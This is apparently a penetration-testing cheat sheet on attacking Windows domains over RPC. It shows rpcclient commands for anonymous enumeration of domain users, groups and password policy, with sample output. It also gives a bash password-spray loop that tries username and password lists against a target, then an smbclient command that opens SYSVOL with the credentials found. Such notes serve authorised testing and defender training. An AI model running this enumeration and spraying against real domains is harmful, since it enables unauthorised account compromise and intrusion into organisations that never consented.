###
RPC
###

**Connect to RPC server with an anonymous bind:**

.. code-block:: none

  $ rpcclient -U "" -N <target>

**Enumerate Domain Users**

.. code-block:: none

  rpcclient $> enumdomusers
  user: [Administrator] rid:[0x1f4]
  ...

**Enumerate Domain Groups**

.. code-block:: none

  rpcclient $> enumdomgroups
  group: [Domain Admins] rid:[0x200]
  ...

**Query Group Information**

.. code-block:: none

  rpcclient $> querygroup 0x200
  Group Name:     Domain Admins
  ...

**Query Group Membership**

.. code-block:: none

  rpcclient $> querygroupmem 0x200
  rid:[0x1f4]   attr:[0x7]
  ...

**Query Specific User Information by RID**

.. code-block:: none

  rpcclient $> queryuser 0x1f4
  User name   :   Administrator
  ...

**Get Domain Password Info**

.. code-block:: none

  rpcclient $> getdompwinfo
  min_password_length: 11
  password_properties: 0x00000000

**Get Domain User Password Info**

.. code-block:: none

  rpcclient $> getusrdompwinfo 0x1f4
  min_password_length: 11
      &info.password_properties: 0x4b58bb34 (1264106292)
      ...

Password Spray Attack
=====================

The following script will iterate over usernames and passwords and try to execute "getusername". Watch out for "ACCOUNT_LOCKED" error messages.

.. code-block:: bash

  TARGET=10.10.10.10;
  while read username; do
    while read password; do
      echo -n "[*] user: $username" && rpcclient -U "$username%$password" -c "getusername;quit" $TARGET | grep -v "NT_STATUS_ACCESS_DENIED";
    done < /path/to/passwords.txt
  done < /path/to/usernames.txt

If a password is found, use it with smbclient to explore the SYSVOL:

.. code-block:: none

  $ smbclient -U "username%password" \\\\<target>\\SYSVOL
  Domain=[HOME] OS=[Windows Server 2008]
  ...
  smb: \> ls
  ...
